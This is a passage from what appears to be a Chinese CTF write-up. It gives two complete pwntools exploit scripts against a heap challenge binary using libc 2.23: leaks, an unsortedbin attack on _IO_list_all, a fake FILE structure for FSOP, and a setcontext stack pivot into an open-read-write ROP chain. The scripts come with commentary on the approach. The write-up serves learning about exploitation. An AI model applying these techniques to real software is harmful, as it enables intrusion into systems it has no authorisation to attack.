class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span> <span class="comment"># 0x410 ~ 0xa9be</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendafter(<span class="string">&#x27;content:\n&#x27;</span>,content)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;which chunk you want to delete?\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;which chunk you want to edit?\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendafter(<span class="string">&#x27;content:\n&#x27;</span>,content)	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;which chunk you want to show?\n&#x27;</span>,<span class="built_in">str</span>(index))	</span><br><span class="line">	</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x6b0</span>,<span class="string">&#x27;hehehehe&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;./flag\x00&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content:\n&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=leak_addr-<span class="number">0x3c4b78</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">main_arena=libc_base+<span class="number">3952488</span></span><br><span class="line">system_libc=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">io_list_all=libc_base+libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">one_gadget_list=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">one_gadget=one_gadget_list[<span class="number">2</span>]+libc_base</span><br><span class="line">success(<span class="string">&#x27;free_hook &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">success(<span class="string">&#x27;malloc_hook &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">success(<span class="string">&#x27;io_list_all &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(io_list_all))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;content:\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base=leak_addr-<span class="number">1344</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;heap_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">pop_rax_ret=libc_base+<span class="number">0x000000000003a738</span></span><br><span class="line">pop_rdi_ret=libc_base+<span class="number">0x0000000000021112</span></span><br><span class="line">pop_rsi_ret=libc_base+<span class="number">0x00000000000202f8</span></span><br><span class="line">pop_rdx_ret=libc_base+<span class="number">0x0000000000001b92</span></span><br><span class="line">syscall_ret=libc_base+<span class="number">0x00000000000bc3f5</span></span><br><span class="line"></span><br><span class="line">bss_addr=heap_base+<span class="number">0x18</span></span><br><span class="line">flag_addr=heap_base+<span class="number">3088</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># open(flag_addr,0)</span></span><br><span class="line">orw =  p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(flag_addr)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(syscall_ret)</span><br><span class="line"><span class="comment"># read(3,bss_addr,0x60)</span></span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">orw += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">orw += p64(syscall_ret)</span><br><span class="line"><span class="comment"># write(1,bss_addr,0x60)</span></span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">orw += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">orw += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) </span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">fake_file += p64(heap_base+<span class="number">1360</span>) <span class="comment"># 这里指向 orw_addr-24 的位置</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span> + orw</span><br><span class="line"></span><br><span class="line">payload= payload.ljust(<span class="number">0x420</span>-<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload= payload + fake_file</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload) <span class="comment"># 确保此时unsortedbin中只有目标chunk</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1040</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>先说一下我的思路吧：</p>
<ul>
<li>我先想到了 house of orange 后半节的 FSOP 攻击，于是进行了模仿</li>
<li>用 unsortedbin attack 在 io_list_all 上写入 main_arena + 88</li>
<li>在利用堆风水，成功构造出 heap overlappling，改写 unsorted chunk-&gt; size 为“0x61”</li>
<li>那么程序就将会把 unsorted chunk 识别为 small chunk，并且会把其当做 FILE 结构体</li>
<li>接下来就在 fake small chunk 中伪造 FILE 结构体，把 vtable 字段写入 ORW 的地址</li>
</ul>
<p>需要注意的地方：</p>
<ul>
<li>堆风水是关键，需要先申请一个大chunk，释放掉，然后再次申请它（这次申请的size要小一些），这样就可以造成堆溢出</li>
<li>其次就是伪造 FILE 结构体的时候，需要保证 unsortedbin 中只有一个chunk（这个chunk将会被修改“size”），不然就会报错</li>
<li>当成功劫持 io_list_all 后，会执行 fake vtable 中的 <code>_IO_OVERFLOW</code>（详情请了解FSOP），可以把它覆盖为我们需要执行的任何函数，而它会把“fake small chunk-&gt; presize”当成它的第一个参数（我直接在这里写上了“/bin/sh”）</li>
</ul>
<p>但这个exp有很明显的问题：</p>
<ul>
<li>ORW链是写在堆上的，根本控制不了栈上的数据（我当时竟然没有发现？！）</li>
</ul>
<p>接下来就需要利用 setcontext 来控制 RSP 了，先看看 setcontext 的代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000047B</span>40 ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000047B</span>40                 push    rdi</span><br><span class="line">.text:<span class="number">0000000000047B</span>41                 lea     rsi, [rdi+<span class="number">128</span>h] ; nset</span><br><span class="line">.text:<span class="number">0000000000047B</span>48                 <span class="keyword">xor</span>     edx, edx        ; oset</span><br><span class="line">.text:<span class="number">0000000000047B</span>4A                 mov     edi, <span class="number">2</span>          ; how</span><br><span class="line">.text:<span class="number">0000000000047B</span>4F                 mov     r10d, <span class="number">8</span>         ; sigsetsize</span><br><span class="line">.text:<span class="number">0000000000047B</span>55                 mov     eax, <span class="number">0</span>Eh</span><br><span class="line">.text:<span class="number">0000000000047B</span>5A                 syscall                 ; LINUX - sys_rt_sigprocmask</span><br><span class="line">.text:<span class="number">0000000000047B</span>5C                 pop     rdi</span><br><span class="line">.text:<span class="number">0000000000047B</span>5D                 cmp     rax, <span class="number">0F</span>FFFFFFFFFFFF001h</span><br><span class="line">.text:<span class="number">0000000000047B</span>63                 jnb     <span class="keyword">short</span> loc_47BC0</span><br><span class="line">.text:<span class="number">0000000000047B</span>65                 mov     rcx, [rdi+<span class="number">0E0</span>h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>6C                 fldenv  byte ptr [rcx]</span><br><span class="line">.text:<span class="number">0000000000047B</span>6E                 ldmxcsr dword ptr [rdi+<span class="number">1</span>C0h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>75                 mov     rsp, [rdi+<span class="number">0</span>A0h] <span class="comment">// target</span></span><br><span class="line">.text:<span class="number">0000000000047B</span>7C                 mov     rbx, [rdi+<span class="number">80</span>h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>83                 mov     rbp, [rdi+<span class="number">78</span>h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>87                 mov     r12, [rdi+<span class="number">48</span>h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>8B                 mov     r13, [rdi+<span class="number">50</span>h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>8F                 mov     r14, [rdi+<span class="number">58</span>h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>93                 mov     r15, [rdi+<span class="number">60</span>h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>97                 mov     rcx, [rdi+<span class="number">0</span>A8h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>9E                 push    rcx</span><br><span class="line">.text:<span class="number">0000000000047B</span>9F                 mov     rsi, [rdi+<span class="number">70</span>h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>A3                 mov     rdx, [rdi+<span class="number">88</span>h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>AA                 mov     rcx, [rdi+<span class="number">98</span>h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>B1                 mov     r8, [rdi+<span class="number">28</span>h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>B5                 mov     r9, [rdi+<span class="number">30</span>h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>B9                 mov     rdi, [rdi+<span class="number">68</span>h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>B9 ; &#125; <span class="comment">// starts at 47B40</span></span><br><span class="line">.text:<span class="number">0000000000047B</span>BD ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000047B</span>BD                 <span class="keyword">xor</span>     eax, eax</span><br><span class="line">.text:<span class="number">0000000000047B</span>BF                 retn</span><br></pre></td></tr></table></figure>
<p>注意这一句：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov     rsp, [rdi+<span class="number">0</span>A0h]</span><br></pre></td></tr></table></figure>
<p>发现这个函数可以根据 <code>rdi</code> 来控制 <code>rsp</code> ，而 <code>rdi</code> 可以被我们控制</p>
<p>但也需要注意这两句：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000047B</span>97                 mov     rcx, [rdi+<span class="number">0</span>A8h]</span><br><span class="line">.text:<span class="number">0000000000047B</span>9E                 push    rcx</span><br></pre></td></tr></table></figure>
<p>这个 push 会扰乱我们的ROP链，把 <code>rcx</code> 作为新的栈顶（这里坑了我好多次）</p>
<p>不多说了，先看看代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span> <span class="comment"># 0x410 ~ 0xa9be</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendafter(<span class="string">&#x27;content:\n&#x27;</span>,content)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;which chunk you want to delete?\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;which chunk you want to edit?\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendafter(<span class="string">&#x27;content:\n&#x27;</span>,content)	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;which chunk you want to show?\n&#x27;</span>,<span class="built_in">str</span>(index))	</span><br><span class="line">	</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x6b0</span>,<span class="string">&#x27;hehehehe&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;./flag\x00&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content:\n&#x27;</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=leak_addr-<span class="number">0x3c4b78</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;libc_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">main_arena=libc_base+<span class="number">3952488</span></span><br><span class="line">system_libc=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">io_list_all=libc_base+libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">setcontext=libc_base+libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">one_gadget_list=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">one_gadget=one_gadget_list[<span class="number">2</span>]+libc_base</span><br><span class="line">success(<span class="string">&#x27;free_hook &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">success(<span class="string">&#x27;malloc_hook &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">success(<span class="string">&#x27;io_list_all &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(io_list_all))</span><br><span class="line">success(<span class="string">&#x27;setcontext &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(setcontext))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)<span class="comment">#2</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;content:\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>)</span><br><span class="line">leak_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base=leak_addr-<span class="number">1344</span></span><br><span class="line">success(<span class="string">&#x27;leak_addr &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&#x27;heap_base &gt;&gt; &#x27;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">pop_rax_ret=libc_base+<span class="number">0x000000000003a738</span></span><br><span class="line">pop_rdi_ret=libc_base+<span class="number">0x0000000000021112</span></span><br><span class="line">pop_rsi_ret=libc_base+<span class="number">0x00000000000202f8</span></span><br><span class="line">pop_rdx_ret=libc_base+<span class="number">0x0000000000001b92</span></span><br><span class="line">syscall_ret=libc_base+<span class="number">0x00000000000bc3f5</span></span><br><span class="line"></span><br><span class="line">bss_addr=heap_base+<span class="number">0x18</span></span><br><span class="line">flag_addr=heap_base+<span class="number">3088</span></span><br><span class="line">orw_addr=heap_base+<span class="number">1392</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># open(flag_addr,0)</span></span><br><span class="line">orw =  p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(flag_addr)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rdx_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(syscall_ret)</span><br><span class="line"><span class="comment"># read(3,bss_addr,0x60)</span></span><br><span class="line">orw +=  p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">orw += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">orw += p64(syscall_ret)</span><br><span class="line"><span class="comment"># write(1,bss_addr,0x60)</span></span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(bss_addr)</span><br><span class="line">orw += p64(pop_rdx_ret) + p64(<span class="number">0x60</span>)</span><br><span class="line">orw += p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">frame_rsp=orw_addr+<span class="number">8</span></span><br><span class="line">frame_rcx=pop_rax_ret</span><br><span class="line">frame = p64(frame_rsp) <span class="comment">#rdi+0xA0</span></span><br><span class="line">frame += p64(frame_rcx) <span class="comment">#rdi+0xA8</span></span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>) </span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xa0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(frame_rsp) <span class="comment">#rdi+0xA0</span></span><br><span class="line">fake_file += p64(frame_rcx) <span class="comment">#rdi+0xA8</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">fake_file += p64(heap_base+<span class="number">1360</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span> + p64(setcontext+<span class="number">53</span>) + orw</span><br><span class="line">payload= payload.ljust(<span class="number">0x420</span>-<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload= payload+fake_file</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x410</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;size:\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1040</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>这里说明一下 setcontext 的使用：</p>
<p>这里我选择把 setcontext 写入 fake vtable-&gt;_IO_OVERFLOW 中 ，执行 setcontext 时，<code>rdi</code> 寄存器就会指向“fake small chunk-&gt; presize”所在的地址，而我提前在 <code>rdi+0xa0</code> 和 <code>rdi+0xa8</code> 的位置布置好 <code>fake rsp</code> 和 <code>fake rcx</code> </p>
